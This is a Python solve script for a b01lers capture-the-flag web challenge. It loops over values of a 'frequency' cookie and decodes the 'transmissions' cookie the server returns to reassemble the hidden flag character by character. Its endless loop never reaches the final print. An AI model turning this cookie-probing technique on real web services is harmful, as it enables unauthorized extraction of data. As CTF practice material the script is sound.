#!/usr/bin/env python3

import requests
from urllib.parse import unquote

url = 'http://web.ctf.b01lers.com:1002/'

def get_transmissions(frequency):
    cookies = {
        'frequency': frequency,
        'transmissions': 'asdf',
    }
    # cookies = dict(frequency=frequency, transmissions='asdf')
    headers = {
        'Cookie': 'frequency={0}; transmissions=asdf'.format(frequency)
    }
    r = requests.get(url, headers=headers)
    # return r.headers['Set-Cookie']
    return r.cookies['transmissions']


def main():
    flag = ['' for i in range(1000)]
    i = 0
    while True:
        cookie = get_transmissions(i)
        segment = unquote(cookie.replace('kxkxkxkxsh', ''))
        index = int(segment[2:])
        flag[index] = segment[0:1]
        index += 1
        flag[index] = segment[1:2]
        print('[*] leaked flag :', ''.join(flag))
        i += 1
    print('[*] flag :', ''.join(flag))


if __name__ == '__main__':
    main()

